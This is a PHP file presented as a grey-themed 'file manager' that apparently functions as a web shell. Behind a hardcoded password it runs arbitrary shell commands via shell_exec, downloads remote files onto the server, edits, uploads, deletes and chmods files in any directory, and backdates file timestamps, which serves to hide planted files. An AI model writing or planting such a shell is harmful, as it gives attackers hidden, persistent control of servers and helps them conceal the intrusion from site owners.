<?php
/**
 * FILE MANAGER (grey theme, EN)
 * - Login with password_hash + password_verify
 * - Terminal toggle via $enable_terminal
 * - Directories first, then files
 * - Global chmod form at bottom
 * - Touch per item with flexible custom timestamp (input muncul setelah klik)
 */

/* ===================== CONFIG ===================== */


$login_password = 'managuetau';

// enable / disable terminal
$enable_terminal = true;

/* ================================================= */

session_start();
$login_error = '';

// Login process (tanpa hash)
if (isset($_POST['password'])) {
    $input = $_POST['password'];

    // pakai hash_equals kalau ada, kalau tidak fallback ke ==
    $is_valid = function_exists('hash_equals')
        ? hash_equals($login_password, $input)
        : ($login_password === $input);

    if ($is_valid) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Wrong password!";
    }
}

// Show login page if not logged in
if (!isset($_SESSION['logged_in'])) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <style>
            body{
                font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
                background:#000 url('https://r1chie.b-cdn.net/Ling-MLBB.jpg') no-repeat center center fixed;
                background-size:cover;
                color:#111827;
                margin:0;
                font-size:16px;
                font-weight:500;
            }
            .login-container{
                width:320px;
                margin:100px auto;
                background:#f3f4f6;
                padding:22px 20px 24px;
                border-radius:15px;
                text-align:center;
                box-shadow:0 10px 25px rgba(0,0,0,0.35);
            }
            h2{
                margin-top:0;
                margin-bottom:12px;
                font-size:22px;
                font-weight:700;
            }
            input[type="password"]{
                border:2px solid #9ca3af;
                border-radius:10px;
                padding:8px 10px;
                width:85%;
                outline:none;
                background:white;
                font-size:15px;
                font-weight:500;
            }
            input[type="password"]:focus{
                border-color:#4b5563;
                box-shadow:0 0 0 1px rgba(75,85,99,0.5);
            }
            input[type="submit"]{
                background:#4b5563;
                color:white;
                border:none;
                border-radius:15px;
                padding:8px 16px;
                margin-top:12px;
                cursor:pointer;
                font-weight:700;
                font-size:15px;
            }
            input[type="submit"]:hover{
                background:#111827;
            }
            .error{
                color:#b91c1c;
                margin-bottom:8px;
                font-size:14px;
                font-weight:600;
            }
        </style>
    </head>
    <body>
    <div class="login-container">
        <h2>Login</h2>
        <?php if($login_error): ?>
            <div class="error"><?php echo htmlspecialchars($login_error); ?></div>
        <?php endif; ?>
        <form method="POST">
            <input type="password" name="password" placeholder="Password" required><br>
            <input type="submit" value="Login">
        </form>
    </div>
    </body>
    </html>
    <?php
    exit;
}

/* ================== FILE MANAGER LOGIC ================== */

$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if ($dir === false) $dir = getcwd();

$output = null; // for terminal output if enabled

// Action handler
if (isset($_POST['action'])) {
    switch ($_POST['action']) {
        case "create_file":
            if (!empty($_POST['filename'])) {
                @file_put_contents($dir . "/" . $_POST['filename'], "");
            }
            break;

        case "create_folder":
            if (!empty($_POST['foldername'])) {
                @mkdir($dir . "/" . $_POST['foldername']);
            }
            break;

        case "delete":
            if (!empty($_POST['target'])) {
                $target = $dir . "/" . $_POST['target'];
                if (is_dir($target)) {
                    @rmdir($target);
                } else {
                    @unlink($target);
                }
            }
            break;

        case "rename":
            if (!empty($_POST['old']) && !empty($_POST['new'])) {
                @rename($dir . "/" . $_POST['old'], $dir . "/" . $_POST['new']);
            }
            break;

        case "chmod":
            if (!empty($_POST['target']) && !empty($_POST['perm'])) {
                @chmod($dir . "/" . $_POST['target'], octdec($_POST['perm']));
            }
            break;

        case "upload_file":
            if (isset($_FILES['file']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
                @move_uploaded_file($_FILES['file']['tmp_name'], $dir . "/" . $_FILES['file']['name']);
            }
            break;

        case "upload_url":
            if (!empty($_POST['file_url']) && !empty($_POST['file_url_name'])) {
                $content = @file_get_contents($_POST['file_url']);
                if ($content !== false) {
                    @file_put_contents($dir . "/" . $_POST['file_url_name'], $content);
                }
            }
            break;

        case "edit_file":
            if (!empty($_POST['file_name'])) {
                @file_put_contents($dir . "/" . $_POST['file_name'], $_POST['file_content']);
            }
            break;

        case "terminal":
            if ($enable_terminal && function_exists('shell_exec')) {
                $command = $_POST['command'];
                $output = shell_exec("cd " . escapeshellarg($dir) . " && " . $command . " 2>&1");
            } else {
                $output = "Terminal feature is disabled on this server.";
            }
            break;

        case "touch":
            if (!empty($_POST['target'])) {
                $target = $dir . "/" . $_POST['target'];
                $timeStr = isset($_POST['new_mtime']) ? trim($_POST['new_mtime']) : '';
                // default: current time
                $timestamp = time();
                if ($timeStr !== '') {
                    $parsed = strtotime($timeStr);
                    if ($parsed !== false) {
                        $timestamp = $parsed;
                    }
                }
                if (file_exists($target)) {
                    @touch($target, $timestamp);
                } else {
                    // standard touch behavior: create empty file then set time
                    @file_put_contents($target, "");
                    @touch($target, $timestamp);
                }
            }
            break;
    }
}

// Helpers
function human_filesize($bytes, $decimals = 2)
{
    $size = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$size[$factor];
}

function breadcrumbs($path)
{
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $crumbs = [];
    $accum = '';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $accum .= '/' . $part;
        $crumbs[] = "<a href='?dir=" . urlencode($accum) . "'>" . htmlspecialchars($part) . "</a>";
    }
    return implode(" / ", $crumbs);
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>FILE MANAGER</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        :root{
            --bg:#e5e7eb;
            --bg-card:#f9fafb;
            --border:#d1d5db;
            --text:#111827;
            --muted:#6b7280;
            --accent:#4b5563;
            --accent-soft:#e5e7eb;
            --accent-strong:#111827;
            --radius-lg:14px;
        }

        *{
            box-sizing:border-box;
        }

        body{
            margin:0;
            font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
            background:var(--bg);
            color:var(--text);
            font-size:15px;
            font-weight:500;
        }

        a{
            color:#2563eb;
            text-decoration:none;
            font-weight:600;
        }
        a:hover{
            text-decoration:underline;
        }

        .app{
            max-width:1100px;
            margin:24px auto 40px;
            padding:0 16px;
        }

        .topbar{
            display:flex;
            align-items:center;
            justify-content:space-between;
            margin-bottom:20px;
        }

        .topbar-title{
            display:flex;
            align-items:center;
            gap:8px;
        }

        .logo-pill{
            width:36px;
            height:36px;
            border-radius:999px;
            background:linear-gradient(135deg,#6b7280,#111827);
            display:flex;
            align-items:center;
            justify-content:center;
            color:white;
            font-weight:800;
            font-size:18px;
            box-shadow:0 8px 16px rgba(0,0,0,0.12);
        }

        h1{
            font-size:24px;
            margin:0;
            font-weight:800;
        }

        .subtitle{
            font-size:14px;
            color:var(--muted);
            font-weight:600;
        }

        .btn{
            display:inline-flex;
            align-items:center;
            justify-content:center;
            padding:8px 14px;
            border-radius:999px;
            border:1px solid transparent;
            font-size:13px;
            cursor:pointer;
            background:var(--accent);
            color:white;
            font-weight:700;
            transition:.2s;
        }

        .btn:hover{
            background:var(--accent-strong);
            box-shadow:0 6px 14px rgba(0,0,0,0.12);
            transform:translateY(-1px);
        }

        .btn-outline{
            background:white;
            color:var(--text);
            border-color:var(--border);
        }
        .btn-outline:hover{
            background:#f3f4f6;
        }

        .btn-xs{
            padding:4px 9px;
            font-size:12px;
        }

        .card{
            background:var(--bg-card);
            border-radius:var(--radius-lg);
            border:1px solid var(--border);
            padding:14px 16px;
            box-shadow:0 10px 30px rgba(15,23,42,0.04);
            margin-bottom:16px;
        }

        .card-header{
            display:flex;
            justify-content:space-between;
            align-items:center;
            margin-bottom:10px;
        }

        .card-title{
            font-size:16px;
            font-weight:800;
        }

        .badge{
            display:inline-flex;
            align-items:center;
            gap:6px;
            padding:4px 10px;
            border-radius:999px;
            background:var(--accent-soft);
            color:var(--accent-strong);
            font-size:12px;
            font-weight:700;
        }

        .breadcrumbs{
            font-size:14px;
            white-space:nowrap;
            overflow-x:auto;
            font-weight:600;
        }

        .breadcrumbs a{
            color:var(--text);
        }

        .breadcrumbs a:hover{
            color:#2563eb;
        }

        .table-wrapper{
            overflow:auto;
        }

        table{
            width:100%;
            border-collapse:collapse;
            font-size:14px;
        }

        th,td{
            padding:9px 10px;
            text-align:left;
            border-bottom:1px solid #e5e7eb;
            vertical-align:middle;
            font-weight:600;
        }

        th{
            background:#e5e7eb;
            font-weight:800;
            color:var(--muted);
            position:sticky;
            top:0;
            z-index:1;
        }

        tr:hover td{
            background:#f3f4f6;
        }

        .file-name{
            display:flex;
            align-items:center;
            gap:8px;
            font-weight:700;
        }

        .icon{
            font-size:14px;
        }

        .size-col{
            width:110px;
            white-space:nowrap;
        }

        .date-col{
            width:170px;
            white-space:nowrap;
        }

        .actions{
            display:flex;
            flex-wrap:wrap;
            gap:6px;
        }

        .inline-form{
            display:inline-flex;
            align-items:center;
            gap:4px;
        }

        .inline-form input[type="text"]{
            width:130px;
        }

        input[type="text"],
        input[type="file"],
        input[type="password"],
        textarea{
            border-radius:999px;
            border:1px solid var(--border);
            padding:7px 10px;
            font-size:14px;
            outline:none;
            width:100%;
            max-width:100%;
            background:white;
            font-weight:600;
        }

        textarea{
            border-radius:12px;
            min-height:260px;
            font-family:Menlo,Consolas,monospace;
        }

        input[type="text"]:focus,
        input[type="file"]:focus,
        textarea:focus{
            border-color:var(--accent);
            box-shadow:0 0 0 1px rgba(75,85,99,0.35);
        }

        .form-grid{
            display:grid;
            grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
            gap:12px;
        }

        .field-label{
            font-size:14px;
            font-weight:700;
            margin-bottom:6px;
            color:var(--muted);
        }

        .terminal{
            background:#111827;
            color:#e5e7eb;
            border-radius:12px;
            padding:10px 12px;
            font-family:Menlo,monospace;
            font-size:13px;
            max-height:260px;
            overflow:auto;
        }

        .terminal pre{
            margin:0;
            white-space:pre-wrap;
            word-wrap:break-word;
        }

        .terminal-label{
            font-size:12px;
            color:#9ca3af;
            margin-bottom:4px;
            font-weight:700;
        }

        .helper-text{
            font-size:12px;
            color:var(--muted);
            margin-top:4px;
            font-weight:600;
        }

        @media (max-width:720px){
            .topbar{
                flex-direction:column;
                align-items:flex-start;
                gap:6px;
            }
            .actions{
                flex-direction:column;
                align-items:flex-start;
            }
            .inline-form{
                width:100%;
            }
            .inline-form input[type="text"]{
                flex:1;
            }
        }
    </style>
</head>
<body>
<div class="app">

    <div class="topbar">
        <div class="topbar-title">
            <div class="logo-pill">C</div>
            <div>
                <h1>FILE MANAGER</h1>
                <div class="subtitle">Mai Kuailan</div>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <div class="card-title">Current path</div>
            <span class="badge">Active path</span>
        </div>
        <div class="breadcrumbs">
            <?php echo breadcrumbs($dir); ?>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <div class="card-title">Directory & file list</div>
        </div>
        <div class="table-wrapper">
            <table>
                <tr>
                    <th>Name</th>
                    <th class="size-col">Size</th>
                    <th class="date-col">Last modified</th>
                    <th>Actions</th>
                </tr>
                <?php
                $scan = scandir($dir);
                $dirs = [];
                $files = [];

                foreach ($scan as $file) {
                    if ($file == '.' || $file == '..') continue;
                    $full = $dir . "/" . $file;
                    if (is_dir($full)) {
                        $dirs[] = $file;
                    } else {
                        $files[] = $file;
                    }
                }

                sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
                sort($files, SORT_NATURAL | SORT_FLAG_CASE);

                // Up one level row
                if ($dir != DIRECTORY_SEPARATOR) {
                    echo "<tr><td colspan='4'><a href='?dir=" . urlencode(dirname($dir)) . "'>[..] up</a></td></tr>";
                }

                // Directories first
                foreach ($dirs as $file) {
                    $full = $dir . "/" . $file;
                    $size = '-';
                    $mtime = @filemtime($full);
                    $mtimeText = $mtime ? date("Y-m-d H:i", $mtime) : '-';
                    echo "<tr>";
                    echo "<td><div class='file-name'><span class='icon'>📁</span>" . htmlspecialchars($file) . "</div></td>";
                    echo "<td class='size-col'>" . $size . "</td>";
                    echo "<td class='date-col'>" . $mtimeText . "</td>";
                    echo "<td>";
                    echo "<div class='actions'>";
                    echo "<a href='?dir=" . urlencode($full) . "' class='btn btn-outline btn-xs'>Open</a>";
                    echo "<form class='inline-form' method='POST'>
                            <input type='hidden' name='action' value='delete'>
                            <input type='hidden' name='target' value='" . htmlspecialchars($file, ENT_QUOTES) . "'>
                            <input type='submit' class='btn btn-outline btn-xs' value='Delete'>
                          </form>";
                    echo "<form class='inline-form' method='POST'>
                            <input type='hidden' name='action' value='rename'>
                            <input type='hidden' name='old' value='" . htmlspecialchars($file, ENT_QUOTES) . "'>
                            <input type='text' name='new' placeholder='New name'>
                            <input type='submit' class='btn btn-outline btn-xs' value='Rename'>
                          </form>";
                    // TOUCH: input & submit hidden sampai tombol Touch diklik
                    echo "<form class='inline-form touch-form' method='POST'>
                            <input type='hidden' name='action' value='touch'>
                            <input type='hidden' name='target' value='" . htmlspecialchars($file, ENT_QUOTES) . "'>
                            <input type='text' name='new_mtime' class='touch-input' placeholder='YYYY-mm-dd HH:MM' style='display:none;'>
                            <input type='submit' class='btn btn-outline btn-xs touch-submit' value='Apply' style='display:none;'>
                            <button type='button' class='btn btn-outline btn-xs touch-toggle'>Touch</button>
                          </form>";
                    echo "</div>";
                    echo "</td>";
                    echo "</tr>";
                }

                // Then files
                foreach ($files as $file) {
                    $full = $dir . "/" . $file;
                    $size = human_filesize(filesize($full));
                    $mtime = @filemtime($full);
                    $mtimeText = $mtime ? date("Y-m-d H:i", $mtime) : '-';
                    echo "<tr>";
                    echo "<td><div class='file-name'><span class='icon'>📄</span>" . htmlspecialchars($file) . "</div></td>";
                    echo "<td class='size-col'>" . $size . "</td>";
                    echo "<td class='date-col'>" . $mtimeText . "</td>";
                    echo "<td>";
                    echo "<div class='actions'>";
                    echo "<form class='inline-form' method='POST'>
                            <input type='hidden' name='action' value='delete'>
                            <input type='hidden' name='target' value='" . htmlspecialchars($file, ENT_QUOTES) . "'>
                            <input type='submit' class='btn btn-outline btn-xs' value='Delete'>
                          </form>";
                    echo "<form class='inline-form' method='POST'>
                            <input type='hidden' name='action' value='rename'>
                            <input type='hidden' name='old' value='" . htmlspecialchars($file, ENT_QUOTES) . "'>
                            <input type='text' name='new' placeholder='New name'>
                            <input type='submit' class='btn btn-outline btn-xs' value='Rename'>
                          </form>";
                    // TOUCH: sama seperti folder
                    echo "<form class='inline-form touch-form' method='POST'>
                            <input type='hidden' name='action' value='touch'>
                            <input type='hidden' name='target' value='" . htmlspecialchars($file, ENT_QUOTES) . "'>
                            <input type='text' name='new_mtime' class='touch-input' placeholder='YYYY-mm-dd HH:MM' style='display:none;'>
                            <input type='submit' class='btn btn-outline btn-xs touch-submit' value='Apply' style='display:none;'>
                            <button type='button' class='btn btn-outline btn-xs touch-toggle'>Touch</button>
                          </form>";
                    echo "<a href='?dir=" . urlencode($dir) . "&edit=" . urlencode($file) . "' class='btn btn-outline btn-xs'>Edit</a>";
                    echo "<a href='" . htmlspecialchars($full, ENT_QUOTES) . "' download class='btn btn-outline btn-xs'>Download</a>";
                    echo "</div>";
                    echo "</td>";
                    echo "</tr>";
                }
                ?>
            </table>
        </div>
        <div class="helper-text">
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <div class="card-title">Create folder / file</div>
        </div>
        <div class="form-grid">
            <div>
                <div class="field-label">New folder</div>
                <form method="POST">
                    <input type="hidden" name="action" value="create_folder">
                    <input type="text" name="foldername" placeholder="Folder name" required>
                    <div style="margin-top:8px;">
                        <input type="submit" class="btn" value="Create folder">
                    </div>
                </form>
            </div>
            <div>
                <div class="field-label">New file</div>
                <form method="POST">
                    <input type="hidden" name="action" value="create_file">
                    <input type="text" name="filename" placeholder="File name" required>
                    <div style="margin-top:8px;">
                        <input type="submit" class="btn" value="Create file">
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <div class="card-title">Upload file</div>
        </div>
        <div class="form-grid">
            <div>
                <div class="field-label">Upload from device</div>
                <form method="POST" enctype="multipart/form-data">
                    <input type="hidden" name="action" value="upload_file">
                    <input type="file" name="file" required>
                    <div style="margin-top:8px;">
                        <input type="submit" class="btn" value="Upload">
                    </div>
                </form>
            </div>
            <div>
                <div class="field-label">Upload via URL</div>
                <form method="POST">
                    <input type="hidden" name="action" value="upload_url">
                    <input type="text" name="file_url" placeholder="File URL" required style="margin-bottom:6px;">
                    <input type="text" name="file_url_name" placeholder="Save as" required>
                    <div style="margin-top:8px;">
                        <input type="submit" class="btn" value="Upload via URL">
                    </div>
                </form>
            </div>
        </div>
    </div>

    <?php
    if (isset($_GET['edit'])) {
        $edit_file = $dir . "/" . $_GET['edit'];
        if (is_file($edit_file)) {
            $content = htmlspecialchars(@file_get_contents($edit_file));
            ?>
            <div class="card">
                <div class="card-header">
                    <div class="card-title">Edit file: <?php echo htmlspecialchars($_GET['edit']); ?></div>
                </div>
                <form method="POST">
                    <input type="hidden" name="action" value="edit_file">
                    <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                    <textarea name="file_content"><?php echo $content; ?></textarea>
                    <div style="margin-top:10px;display:flex;gap:8px;justify-content:flex-end;">
                        <input type="submit" class="btn" value="Save changes">
                    </div>
                </form>
            </div>
            <?php
        }
    }
    ?>

    <?php if ($enable_terminal): ?>
        <div class="card">
            <div class="card-header">
                <div class="card-title">Terminal</div>
            </div>
            <form method="POST" style="margin-bottom:10px;">
                <input type="hidden" name="action" value="terminal">
                <input type="text" name="command" placeholder="Enter Linux command, e.g. ls -la" required>
                <div style="margin-top:8px;">
                    <input type="submit" class="btn" value="Run">
                </div>
            </form>
            <div class="terminal">
                <div class="terminal-label">Output:</div>
                <?php if(isset($output)) echo "<pre>".htmlspecialchars($output)."</pre>"; ?>
            </div>
        </div>
    <?php else: ?>
        <div class="card">
            <div class="card-header">
                <div class="card-title">Terminal</div>
            </div>
            <div class="helper-text">
                Terminal feature is disabled in configuration (<code>$enable_terminal = false</code>).  
                Set it to <code>true</code> at the top of this file if you want to enable it (make sure your hosting allows it).
            </div>
        </div>
    <?php endif; ?>

    <div class="card">
        <div class="card-header">
            <div class="card-title">Change permissions (chmod)</div>
        </div>
        <form method="POST" class="form-grid">
            <div>
                <div class="field-label">File / folder name</div>
                <input type="text" name="target" placeholder="Example: index.php or my-folder" required>
            </div>
            <div>
                <div class="field-label">Permission (octal)</div>
                <input type="text" name="perm" placeholder="Example: 0644 or 0755" required>
            </div>
            <div style="align-self:end;">
                <input type="hidden" name="action" value="chmod">
                <input type="submit" class="btn" value="Apply chmod">
            </div>
        </form>
    </div>

</div>

<!-- JS untuk toggle input Touch -->
<script>
document.addEventListener('DOMContentLoaded', function () {
    document.querySelectorAll('.touch-toggle').forEach(function (btn) {
        btn.addEventListener('click', function () {
            var form   = this.closest('.touch-form');
            var input  = form.querySelector('.touch-input');
            var submit = form.querySelector('.touch-submit');

            // tampilkan input + tombol Apply
            input.style.display  = 'inline-block';
            submit.style.display = 'inline-flex';

            // sembunyikan tombol Touch awal
            this.style.display = 'none';

            // fokus ke input biar enak ngetik
            input.focus();
        });
    });
});
</script>

</body>
</html>
